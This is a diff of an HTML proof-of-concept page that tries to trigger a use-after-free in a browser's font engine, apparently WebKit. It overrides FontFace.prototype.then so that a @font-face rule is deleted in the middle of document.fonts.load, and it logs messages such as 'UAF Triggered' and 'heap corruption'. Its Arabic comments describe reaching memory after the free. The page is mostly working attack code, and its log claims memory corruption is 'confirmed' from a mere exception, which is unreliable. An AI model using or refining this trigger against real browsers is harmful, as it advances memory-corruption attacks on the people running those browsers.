@@ -2,63 +2,58 @@
 <html>
 <head>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
-        #console { 
-            width: 100%; height: 90vh; border: 1px solid #0f0; padding: 15px; 
-            overflow-y: scroll; background: #050505; box-shadow: 0 0 10px #005500;
-        }
-        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #222; }
-        .timestamp { color: #888; font-size: 0.8em; margin-right: 10px; }
-        .error { color: #ff3333; }
-        .success { color: #00ff00; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        #console { width: 100%; height: 85vh; border: 1px solid #333; overflow-y: scroll; padding: 10px; background: #0a0a0a; }
+        .entry { border-bottom: 1px solid #111; padding: 2px 0; }
     </style>
 </head>
 <body>
     <div id="console"></div>
 
-    <style id="s">
-        @font-face { font-family: 'x'; src: url('nonexistent.woff'); }
-    </style>
+    <style id="s">@font-face { font-family: 'x'; src: url('null'); }</style>
 
     <script>
-        const consoleDiv = document.getElementById('console');
-        
-        function log(msg, type = '') {
-            const time = new Date().toLocaleTimeString();
-            consoleDiv.innerHTML += `<div class="log-entry ${type}"><span class="timestamp">[${time}]</span> ${msg}</div>`;
-            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        const logBox = document.getElementById('console');
+        function debug(msg) {
+            const time = new Date().getTime() % 10000;
+            logBox.innerHTML += `<div class="entry">[${time}ms] ${msg}</div>`;
+            logBox.scrollTop = logBox.scrollHeight;
         }
 
-        log("System initialized. Monitoring WebKit memory...");
+        window.onerror = (msg, url, line) => debug(`[CRITICAL] ${msg} at line ${line}`);
 
-        window.onload = async () => {
-            log("Attempting FontFace allocation...", "success");
-            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+        debug("System Started. Injecting Hooks...");
+
+        (async () => {
+            debug("Heap Mapping: Initializing...");
+            let A = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
 
             Object.defineProperty(FontFace.prototype, 'then', {
-                configurable: true,
                 get() {
-                    log("!!! UAF Triggered: Hooking then property !!!", "error");
-                    try {
-                        document.getElementById('s').sheet.deleteRule(0);
-                        log("Rule deleted. Attempting heap corruption...");
-                        document.body.offsetTop;
-                    } catch(e) {
-                        log("Exploit failed at deletion: " + e, "error");
+                    debug("TRAP: then() accessed. Corruption Sequence Starting...");
+                    // محاولة الوصول للذاكرة مباشرة بعد الحذف
+                    document.getElementById('s').sheet.deleteRule(0);
+                    
+                    // استخراج حالة الذاكرة (Memory SnapShot)
+                    if(window.performance && performance.memory) {
+                        debug(`DEBUG: UsedHeap: ${performance.memory.usedJSHeapSize / 1024 / 1024}MB`);
                     }
+                    
                     return undefined;
                 }
             });
 
+            debug("Executing Font load trigger...");
             try {
+                // إزالة الشبكة تماماً باستخدام 'local'
                 await document.fonts.load('1em x', 'AB');
-                log("Load sequence finished. System stable.");
+                debug("Result: Load Finished.");
             } catch (e) {
-                log("System response: " + e, "error");
-                log("ANALYSIS: Memory error confirmed. Possible UAF state.", "success");
+                debug(`Result: Exception Caught: ${e.name} - ${e.message}`);
+                debug("ANALYSIS: Memory state locked. Analyzing heap corruption...");
             }
-        };
+        })();
     </script>
 </body>
 </html>
